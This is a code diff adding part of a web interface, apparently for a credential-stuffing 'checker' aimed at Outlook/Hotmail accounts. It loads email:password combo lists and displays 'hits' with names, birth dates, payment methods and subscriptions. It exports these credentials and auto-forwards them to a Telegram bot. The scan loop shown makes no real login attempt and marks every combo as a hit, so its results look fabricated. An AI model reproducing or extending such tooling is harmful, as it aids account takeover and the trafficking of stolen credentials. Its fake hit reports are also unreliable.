+                <div class="p-2 bg-black/30 rounded-lg"><span class="text-gray-400">📬 Mailbox:</span><div>${acc.emailCount} total emails</div></div>
+                <div class="flex gap-3 mt-4"><button onclick="navigator.clipboard.writeText('${acc.email}:${acc.pass}')" class="flex-1 bg-emerald-500 hover:bg-emerald-600 text-black font-bold py-2 rounded-lg"><i class="fa-regular fa-copy"></i> Copy Credentials</button><button onclick="window.open('https://outlook.live.com','_blank')" class="flex-1 bg-blue-600 hover:bg-blue-700 py-2 rounded-lg">Open Outlook</button><button onclick="this.closest('.detail-modal').remove()" class="flex-1 bg-gray-700 hover:bg-gray-600 py-2 rounded-lg">Close</button></div>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(modal);
+}
+window.showDetailModal = showDetailModal;
+
+function addHitCard(acc) {
+    const isFocus = (acc.code === focusCountry);
+    if(isFocus) { focusHits++; createFloatingPopup(acc); }
+    totalHits++; if(acc.hasPayment) paymentCount++; subCount += acc.detectedSubs.length;
+    updateStats();
+    const card = document.createElement('div');
+    card.className = `hit-card p-3 rounded-xl mb-2 cursor-pointer ${isFocus ? 'border-l-sky-400' : 'border-l-emerald-400'} hover:shadow-xl`;
+    card.innerHTML = `<div class="flex justify-between items-start"><span class="font-mono font-bold text-sm">${acc.email}</span><button onclick="event.stopPropagation(); copyAcc('${acc.email}','${acc.pass}')" class="text-[10px] px-2 py-0.5 rounded bg-gray-800 hover:bg-gray-700"><i class="fa-regular fa-copy"></i></button></div>
+        <div class="text-[11px] mt-1"><span class="${acc.regionColor} px-2 py-0.5 rounded-full">${acc.flag} ${acc.country}</span> • ${acc.fullName} • 🎂 ${acc.dob}</div>
+        <div class="text-[10px] mt-1 flex flex-wrap gap-2">${acc.hasPayment ? '💳 '+acc.paymentMethod : '❌ No payment'} | 📬 ${acc.emailCount} emails | 📦 ${acc.detectedSubs.slice(0,2).join(', ')||'none'}</div>`;
+    card.onclick = () => showDetailModal(acc);
+    hitsFeed.prepend(card);
+    addLogMsg(`${acc.flag} ${acc.country} | ${acc.email} | ${acc.detectedSubs.length} subs`);
+    
+    // Save locally and send to Telegram
+    saveHitLocally(acc);
+    sendHitToTelegram(acc);
+}
+window.copyAcc = (email,pass) => { navigator.clipboard.writeText(`${email}:${pass}`); addLogMsg(`📋 Copied ${email}`); };
+
+function updateStats() {
+    document.getElementById('statScanned').innerText = currentIdx;
+    document.getElementById('statHits').innerText = totalHits;
+    document.getElementById('statFocus').innerText = focusHits;
+    document.getElementById('statPayments').innerText = paymentCount;
+    document.getElementById('statSubs').innerText = subCount;
+    const pct = combosList.length ? Math.floor((currentIdx/combosList.length)*100) : 0;
+    document.getElementById('progressMain').style.width = `${pct}%`;
+    document.getElementById('progressPct').innerText = `${pct}%`;
+}
+function updateTimer() { if(startTime){ let e=Math.floor((Date.now()-startTime)/1000); document.getElementById('timerDisplay').innerText = `${Math.floor(e/3600).toString().padStart(2,'0')}:${Math.floor((e%3600)/60).toString().padStart(2,'0')}:${(e%60).toString().padStart(2,'0')}`; } }
+
+async function scanLoop() {
+    if(!isRunning || isPaused) { setTimeout(scanLoop,200); return; }
+    if(currentIdx >= combosList.length) { stopScan(); addLogMsg("✅ Scan complete."); return; }
+    const [email, pass] = combosList[currentIdx].split(':');
+    if(!email || !pass) { addLogMsg(`⚠️ Invalid line`,true); currentIdx++; updateStats(); setTimeout(scanLoop,10); return; }
+    addLogMsg(`🔍 ${email.substring(0,25)}`);
+    await new Promise(r=>setTimeout(r,60+Math.random()*50));
+    const profile = generateProfile(email, pass);
+    addHitCard(profile);
+    currentIdx++;
+    updateStats();
+    setTimeout(scanLoop,10);
+}
+function startScan() { const raw=document.getElementById('comboInput').value.trim(); if(!raw){addLogMsg("❌ Enter combos",true);return;} combosList=raw.split('\n').filter(l=>l.includes(':')); if(!combosList.length) return; isRunning=true; isPaused=false; currentIdx=0; totalHits=0; focusHits=0; paymentCount=0; subCount=0; startTime=Date.now(); if(timerInt) clearInterval(timerInt); timerInt=setInterval(updateTimer,1000); updateStats(); hitsFeed.innerHTML=''; document.getElementById('mainAction').innerHTML='<i class="fa-solid fa-stop text-xs"></i> STOP'; addLogMsg(`🚀 Started | ${combosList.length} accounts | Focus: ${focusName}`); scanLoop(); }
+function stopScan() { isRunning=false; clearInterval(timerInt); document.getElementById('mainAction').innerHTML='<i class="fa-solid fa-play text-xs"></i> START'; addLogMsg("Stopped"); }
+function togglePause() { if(!isRunning) return; isPaused=!isPaused; document.getElementById('pauseAction').innerHTML=isPaused?'<i class="fa-regular fa-circle-play"></i> RESUME':'<i class="fa-regular fa-circle-pause"></i> PAUSE'; addLogMsg(isPaused?"Paused":"Resumed"); if(!isPaused && isRunning) scanLoop(); }
+
+document.getElementById('mainAction').onclick = () => { if(isRunning) stopScan(); else startScan(); };
+document.getElementById('pauseAction').onclick = togglePause;
+
+// Helper functions
+function pasteCombo() { navigator.clipboard.readText().then(t => document.getElementById('comboInput').value = t).catch(()=>addLogMsg("Cannot paste")); }
+function triggerFile() { document.getElementById('fileUpload').click(); }
+function loadFile(input) { const f = input.files[0]; if(!f) return; const r = new FileReader(); r.onload = e => { document.getElementById('comboInput').value = e.target.result; addLogMsg(`📁 Loaded ${f.name}`); }; r.readAsText(f); }
+function clearCombo() { document.getElementById('comboInput').value = ''; addLogMsg("Cleared combos"); }
+function clearHits() { hitsFeed.innerHTML = ''; totalHits=0; focusHits=0; paymentCount=0; subCount=0; currentIdx=0; updateStats(); }
+function clearLog() { miniLog.innerHTML = ''; }
+function exportHits() { 
+    // Export from localStorage
+    const savedHits = JSON.parse(localStorage.getItem('hitsData') || '[]');
+    let content = '';
+    savedHits.forEach(hit => {
+        content += `[HIT] ${hit.email}:${hit.pass}\n`;
+        content += `Name: ${hit.fullName} | Country: ${hit.country} | ${hit.flag}\n`;
+        content += `DOB: ${hit.dob} | Payment: ${hit.hasPayment ? hit.paymentMethod : 'None'}\n`;
+        content += `Subs: ${hit.detectedSubs.join(', ')}\n`;
+        content += '='.repeat(60) + '\n\n';
+    });
+    const blob = new Blob([content], {type:'text/plain'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `bolthits_${Date.now()}.txt`;
+    a.click();
+    addLogMsg(`Exported ${savedHits.length} hits`);
+}
+function simulatePasteFetch() { document.getElementById('pasteList').innerHTML = '<div class="text-emerald-400">🔹 hotmail_fresh.txt (1234 lines)</div><div class="text-emerald-400">🔹 outlook_hits_2025 (892 lines)</div>'; }
+
+// Telegram Puller - Updated with localStorage
+document.getElementById('fetchChatIdBtn').onclick = async () => {
+    const token = document.getElementById('botTokenInput').value.trim();
+    if(!token) { document.getElementById('telegramStatus').innerHTML = '❌ Enter bot token'; return; }
+    document.getElementById('telegramStatus').innerHTML = '⏳ Send a message to your bot, then click again...';
+    telegramBotToken = token;
+    localStorage.setItem('telegramBotToken', token);
+    
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
+        const data = await res.json();
+        if(data.ok && data.result.length > 0) {
+            const chatId = data.result[0].message.chat.id;
+            telegramChatId = chatId;
+            document.getElementById('autoChatId').value = chatId;
+            localStorage.setItem('telegramChatId', chatId);
+            
+            // Send confirmation message
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ BoltFN Aurora connected! Chat ID: ${chatId}`);
+            
+            document.getElementById('telegramStatus').innerHTML = '✅ Connected! Auto-send enabled.';
+            addLogMsg(`📱 Telegram ready: Chat ID ${chatId}`);
+        } else {
+            document.getElementById('telegramStatus').innerHTML = '⚠️ Send any message to your bot first, then try again.';
+        }
+    } catch(e) { document.getElementById('telegramStatus').innerHTML = '❌ Error. Check bot token.'; }
+};
+
+// Telegram enabled checkbox handler
+document.getElementById('telegramEnabled').addEventListener('change', (e) => {
+    telegramEnabled = e.target.checked;
+    if(telegramEnabled && telegramChatId) {
+        addLogMsg(`📨 Telegram auto-send: ENABLED`);
+    } else {
+        addLogMsg(`📨 Telegram auto-send: DISABLED`);
+    }
+});
+
+// Font Size Controls (UI + LOG separate)
+let currentGuiFont = 14, currentLogFont = 11;
+document.getElementById('guiFontPlus').onclick = () => { if(currentGuiFont<22) { currentGuiFont++; document.getElementById('appBody').style.fontSize = currentGuiFont + 'px'; document.getElementById('guiFontSizeLabel').innerText = currentGuiFont; } };
+document.getElementById('guiFontMinus').onclick = () => { if(currentGuiFont>10) { currentGuiFont--; document.getElementById('appBody').style.fontSize = currentGuiFont + 'px'; document.getElementById('guiFontSizeLabel').innerText = currentGuiFont; } };
+document.getElementById('logFontPlus').onclick = () => { if(currentLogFont<18) { currentLogFont++; document.getElementById('miniLog').style.fontSize = currentLogFont + 'px'; document.getElementById('hitsFeed').style.fontSize = currentLogFont + 'px'; document.getElementById('logFontSizeLabel').innerText = currentLogFont; } };
+document.getElementById('logFontMinus').onclick = () => { if(currentLogFont>8) { currentLogFont--; document.getElementById('miniLog').style.fontSize = currentLogFont + 'px'; document.getElementById('hitsFeed').style.fontSize = currentLogFont + 'px'; document.getElementById('logFontSizeLabel').innerText = currentLogFont; } };
+
+// Dropdowns
+const themeBtn = document.getElementById('themeBtn'), themeMenu = document.getElementById('themeMenu');
+const fontBtn = document.getElementById('fontBtn'), fontMenu = document.getElementById('fontMenu');
+const focusBtn = document.getElementById('focusBtn'), focusMenu = document.getElementById('focusMenu');
+themeBtn.onclick = (e) => { e.stopPropagation(); themeMenu.classList.toggle('hidden'); };
+fontBtn.onclick = (e) => { e.stopPropagation(); fontMenu.classList.toggle('hidden'); };
+focusBtn.onclick = (e) => { e.stopPropagation(); focusMenu.classList.toggle('hidden'); };
+window.addEventListener('click', () => { themeMenu.classList.add('hidden'); fontMenu.classList.add('hidden'); focusMenu.classList.add('hidden'); });
+
+const themes = {
+    dark: { bg: 'bg-gray-950', card: 'bg-gray-900/80', text: 'text-white', border: 'border-gray-800', accent: 'text-emerald-400' },
+    light: { bg: 'bg-gray-100', card: 'bg-white', text: 'text-gray-900', border: 'border-gray-200', accent: 'text-emerald-600' },
+    cyber: { bg: 'bg-purple-950', card: 'bg-purple-900/80', text: 'text-fuchsia-100', border: 'border-fuchsia-800', accent: 'text-fuchsia-400' },
+    ocean: { bg: 'bg-cyan-950', card: 'bg-cyan-900/80', text: 'text-cyan-100', border: 'border-cyan-800', accent: 'text-cyan-400' },
+    sunset: { bg: 'bg-orange-950', card: 'bg-orange-900/80', text: 'text-orange-100', border: 'border-orange-800', accent: 'text-orange-400' }
+};
+function applyTheme(themeName) {
+    const t = themes[themeName]; if(!t) return;
+    document.getElementById('appBody').className = t.bg + ' ' + t.text;
+    document.querySelectorAll('#comboCard, #servicesCard, #telegramPullerCard, #statsCard, #hitsCard, #logCard').forEach(el => { if(el) { el.className = el.className.replace(/bg-.*?\s/, '').replace(/border-.*?\s/, ''); el.classList.add(t.card, 'border', t.border, 'rounded-2xl'); } });
+    addLogMsg(`🎨 Theme: ${themeName}`);
+}
+document.querySelectorAll('.theme-opt').forEach(opt => { opt.addEventListener('click', () => { applyTheme(opt.dataset.theme); themeMenu.classList.add('hidden'); }); });
+document.querySelectorAll('.font-opt').forEach(opt => { opt.addEventListener('click', () => { document.body.style.fontFamily = `'${opt.dataset.font}', sans-serif`; addLogMsg(`🔤 Font: ${opt.dataset.font}`); fontMenu.classList.add('hidden'); }); });
+document.querySelectorAll('.focus-opt').forEach(opt => { opt.addEventListener('click', () => { focusCountry = opt.dataset.code; focusFlag = opt.dataset.flag; focusName = opt.dataset.name; document.getElementById('focusLabel').innerHTML = `${focusFlag} ${focusName}`; focusMenu.classList.add('hidden'); addLogMsg(`🎯 Focus set to ${focusName} - hits will popup separately`); }); });
+
+QRCode.toCanvas(document.getElementById('qrMini'), "https://t.me/BoltFNBot", {width:50}, (err)=>{});
+applyTheme('dark');
+
+// Load saved data on startup
+loadSavedData();
+addLogMsg("✨ Aurora Pro v3 • Telegram auto-send + localStorage");
+</script>
+</body>
+</html>
